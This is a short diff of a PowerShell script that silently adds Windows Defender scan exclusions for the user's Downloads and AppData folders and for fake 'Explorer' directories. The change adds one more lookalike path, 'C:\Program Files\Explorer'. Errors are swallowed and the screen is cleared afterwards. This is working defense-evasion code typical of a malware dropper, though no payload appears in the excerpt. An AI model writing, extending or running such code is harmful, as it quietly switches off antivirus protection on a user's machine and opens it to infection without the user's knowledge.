@@ -3,10 +3,12 @@ $ProgressPreference = 'SilentlyContinue'
 $downloadsPath = "$env:USERPROFILE\Downloads"
 $appDataPath = "$env:USERPROFILE\AppData"
 $explorerPath = "C:\Windows\Explorer"
+$explorerPath2 = "C:\Program Files\Explorer"
 try {
     Add-MpPreference -ExclusionPath $downloadsPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $appDataPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $explorerPath -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath $explorerPath2 -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
 Clear-Host
